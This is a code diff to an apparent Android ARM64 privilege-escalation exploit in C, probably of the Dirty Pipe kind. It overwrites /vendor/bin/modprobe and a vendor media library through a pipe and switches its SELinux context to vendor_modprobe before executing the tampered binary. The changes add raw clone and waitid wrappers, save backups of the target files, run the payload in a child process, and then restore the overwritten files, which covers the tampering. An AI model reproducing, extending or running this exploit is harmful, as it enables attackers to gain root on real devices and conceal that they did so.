@@ -128,6 +128,18 @@ u64 myexecve(const char *p, const char **argv, const char **envp) {
 	return mysyscall((u64)p, argv, envp);
 }
 
+u64 myclone(unsigned long flags, void *stack_base,
+		int *parent_tid, unsigned long tls, int *child_tid) {
+	__asm__("mov x8, SYS_clone\n");
+	return mysyscall(flags, stack_base, parent_tid, tls, child_tid);
+}
+
+#define P_PID 1
+u64 mywaitid(int idtype, u64 id, void *infop, int options, void *ru) {
+	__asm__("mov x8, SYS_waitid\n");
+	return mysyscall(idtype, id, infop, options, ru);
+}
+
 static void prepare_pipe(struct global *global, int p[2])
 {
 	if (mypipe(p)) {
@@ -336,6 +348,8 @@ void lo(struct global *global, const char *p, ...) {
 	va_end(l);
 }
 
+#define LIBMOD_PAGES 4
+
 void c_entry() {
 	const char *modprobe_path = "/vendor/bin/modprobe";
 	const char *libmod_path = "/vendor/lib/libstagefright_soft_mp3dec.so";
@@ -343,6 +357,8 @@ void c_entry() {
 	__asm__(".include \"include.inc\"\n");
 
 	struct global *global = (struct global *)mymmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
+	char *modprobe_backup = (char *)mymmap(0, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
+	char *libmod_backup = (char *)mymmap(0, LIBMOD_PAGES * PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
 
 	prepare_log(global);
 
@@ -353,6 +369,9 @@ void c_entry() {
 	int fds = myopen(modprobe_path, O_RDONLY);
 	int fdmod = myopen(libmod_path, O_RDONLY);
 
+	myread(fds, modprobe_backup, PAGE_SIZE);
+	myread(fdmod, libmod_backup, LIBMOD_PAGES * PAGE_SIZE);
+
 	int p[2];
 	prepare_pipe(global, p);
 
@@ -361,16 +380,29 @@ void c_entry() {
 	next_payload += PAGE_SIZE;
 
 	overwrite(global, p, fds, 1, (char*)next_payload + 1, PAGE_SIZE - 1);
-	for(int i = 0; i < 4; i++){
+	for(int i = 0; i < LIBMOD_PAGES; i++){
 		overwrite(global, p, fdmod, i * PAGE_SIZE + 1, (char*)next_payload + PAGE_SIZE * (i+1) + 1, PAGE_SIZE - 1);
 	}
 
-    const char *selinux_context = "u:r:vendor_modprobe:s0";
-	int fdat = myopen("/proc/self/attr/exec", O_RDWR);
-	mywrite(fdat, selinux_context, mystrlen(selinux_context));
-	myclose(fdat);
+	u64 ret = myclone(SIGCHLD, NULL, NULL, 0, NULL);
 
-	myexecve("/vendor/bin/modprobe", NULL, NULL);
+	if(ret == 0){
+		const char *selinux_context = "u:r:vendor_modprobe:s0";
+		int fdat = myopen("/proc/self/attr/exec", O_RDWR);
+		mywrite(fdat, selinux_context, mystrlen(selinux_context));
+		myclose(fdat);
+
+		myexecve("/vendor/bin/modprobe", NULL, NULL);
+	}else{
+		lo(global, "Wait for child pid=%d\n", ret);
+		u64 ret2 = mywaitid(P_PID, ret, NULL, WEXITED, NULL);
+		lo(global, "waitid returned with %lu. Restore files.\n", ret2);
+
+		overwrite(global, p, fds, 1, modprobe_backup + 1, PAGE_SIZE - 1);
+		for(int i = 0; i < LIBMOD_PAGES; i++){
+			overwrite(global, p, fdmod, i * PAGE_SIZE + 1, libmod_backup + PAGE_SIZE * i + 1, PAGE_SIZE - 1);
+		}
+	}
 
 	__asm__("mov x8, SYS_exit\n");
 	mysyscall(0);
